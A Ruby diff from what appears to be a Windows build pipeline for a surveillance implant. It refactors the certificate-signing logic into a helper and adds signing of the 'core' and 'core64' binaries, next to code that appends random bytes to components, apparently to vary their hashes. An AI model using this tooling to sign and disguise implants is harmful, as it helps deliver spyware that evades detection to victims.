@@ -35,6 +35,9 @@ class BuildWindows < Build
     # invoke the generic patch method with the new params
     super
 
+    # signature for the patched code
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core')}" if to_be_signed?(params)
+
     # calculate the function name for the dropper
     @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
@@ -82,6 +85,9 @@ class BuildWindows < Build
     file.rewind
     file.write content
     file.close
+
+    # signature for the patched code
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)
 
     # add random bytes to codec, rapi and sqlite
     add_random(path('codec'))
@@ -185,24 +191,8 @@ class BuildWindows < Build
   def sign(params)
     trace :debug, "Build: signing: #{params}"
 
-    do_signature = false
-
-    # not requested but the cert is present
-    if params.nil? and File.exist? Config.instance.cert("windows.pfx")
-      do_signature = true
-    end
-
-    # explicit request to sign the code
-    if not params.nil? and params['sign']
-      raise "Cannot find pfx file" unless File.exist? Config.instance.cert("windows.pfx")
-
-      do_signature = true
-    end
-
     # perform the signature
-    if do_signature
-      CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}"
-    end
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
   end
 
   def pack(params)
@@ -217,8 +207,28 @@ class BuildWindows < Build
 
   end
 
+  private
+
   def add_random(file)
     File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
+  end
+
+  def to_be_signed?(params)
+    # default case
+    do_signature = false
+
+    # not requested but the cert is present
+    if params.nil? and File.exist? Config.instance.cert("windows.pfx")
+      do_signature = true
+    end
+
+    # explicit request to sign the code
+    if not params.nil? and params['sign']
+      raise "Cannot find pfx file" unless File.exist? Config.instance.cert("windows.pfx")
+      do_signature = true
+    end
+
+    do_signature
   end
 
 end
